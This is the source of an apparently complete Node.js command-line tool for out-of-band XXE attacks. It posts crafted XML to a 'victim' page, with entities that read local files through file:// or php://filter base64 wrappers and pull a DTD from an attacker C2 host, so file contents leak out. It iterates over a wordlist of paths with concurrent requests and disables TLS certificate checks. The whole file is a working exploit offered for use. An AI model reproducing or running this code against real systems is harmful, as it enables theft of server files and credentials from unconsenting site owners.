const http = require('http');
const https = require('https');
const fs = require('fs');
const url = require('url');
const argv = require('minimist')(process.argv.slice(2));
const async = require("async");



if (argv.h || argv.help) {
    console.log(
        `
Options
        -h\t\t\tPrint this message

        -u <url>\t\t(Required) the victim page, e.g. -u http://vulnerable.site:8080/page.php?a=1
        -w <wordlist>\t\t(Required) the wordlist to load, e.g. -w /usr/share/wordlists/filenames.txt
        --c2 <url>\t\t(Required) the server where server.js is run and waiting for incoming request from victim, e.g. --c2 http://attacker.site:8090

        --proxy <proxy>\t\tThe http proxy to go through for all requests, e.g. --proxy http://127.0.0.1:8080
        --base <path>\t\tThe base path prefixed to all filenames, e.g. --base "/var/www", default "/"
        --php\t\t\tUse this option if the server can handle php protocols, i.e. able to encode the file content using base64
        -t <thread>\t\tIndicate how many threads to run simultaneously, e.g. -t 15, default 5
        -v\t\t\tVerbose output
        --headers <headers>\tAdditional request headers (besides content-type, content-length, and host) in JSON format, e.g. --headers "{'X-CSRF-Token': 'awesome_token', 'Cookie': 'sid=secret_session; admin=1;'}"
        --body <xml>\t\tThe normal POST request body, e.g. --body "<subscribe><email>test@example.com</email><name>test</name></subscribe>", default: <login><username>test</username><password>test</password></login>
        `
    );
    return;
}



// -u http://vulnerable.site/page.php?a=1
var rurl = url.parse(argv.u, true);

var rhost = rurl.hostname;
var rport = rurl.port;
var rpath = rurl.pathname + rurl.search;

var proto = argv.u.startsWith("https") ? https : http;

process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0"; // hack naked

// --proxy http://127.0.0.1:8080
if (argv.proxy != undefined) {
    var purl = url.parse(argv.proxy, true);

    rhost = purl.hostname;
    rport = purl.port;
    rpath = argv.u;
}

// --base "/var/www"
var base_path = argv.base == undefined ? "/" : argv.base;

if (!base_path.endsWith("/")) {
    base_path += "/";
}

var full_path = `file://${base_path}$$$PAYLOAD_HERE$$$`;

if (argv.php) {
    full_path = `php://filter/convert.base64-encode/resource=${base_path}$$$PAYLOAD_HERE$$$`;
}

// --body "<subscribe><email>test@example.com</email><name>test</name></subscribe>"
var normal_xml = argv.body == undefined ? "<login><username>test</username><password>test</password></login>" : argv.body;




var q = async.queue(xxe, argv.t ? argv.t : 5); // Run 5 simultaneous requests

q.drain = function() {
    console.log("All paths are tried");
};

q.push(fs.readFileSync(argv.w).toString().split("\n"));



function xxe(path, cb) {
    var file_path = full_path.replace("$$$PAYLOAD_HERE$$$", path);

    var xml_data = 
        "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
        "<!DOCTYPE test [\n" +
        "   <!ENTITY % file SYSTEM \""+file_path+"\">\n" +
        "   <!ENTITY % path \""+path+"\">\n" +
        "   <!ENTITY % c2url \""+argv.c2+"\">\n" +
        "   <!ENTITY % dtd SYSTEM \""+argv.c2+"/"+encodeURIComponent(path)+"/send.dtd\">\n" +
        "%dtd;\n" +
        "]>\n" +
        normal_xml;

    var req_opts = {
        host: rhost,
        port: rport,
        path: rpath,
        method: 'POST',
        headers: {
            'Content-Type': 'text/xml',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Content-Length': Buffer.byteLength(xml_data),
            'Host': rurl.hostname
        }
    };

    // --headers "{'X-CSRF-Token': 'blah', 'Content-Type': 'application/json'}"
    Object.assign(req_opts.headers, JSON.parse(argv.headers));

    // verbose
    if (argv.v) {
        console.log(`[DEBUG] Request body: ${xml_data}\n[DEBUG] Request options: ${JSON.stringify(req_opts)}`);
    }

    var req = proto.request(req_opts, (resp) => {

        var body = '';
        resp.on('data', (chunk) => {
            body += chunk;
        });
        resp.on('end', () => {
           console.log(`${path} response code - length: ${resp.statusCode} - ${body.length}`);
           if (argv.v) {
                console.log(`[DEBUG] ${path} response: ${body}`);
           }
           cb();
        });
    });

    req.write(xml_data);
    req.on("error", (err) => {
        console.log(`[ERROR] - ${path} - ${err}`);
        cb();
    });
    req.end;
}
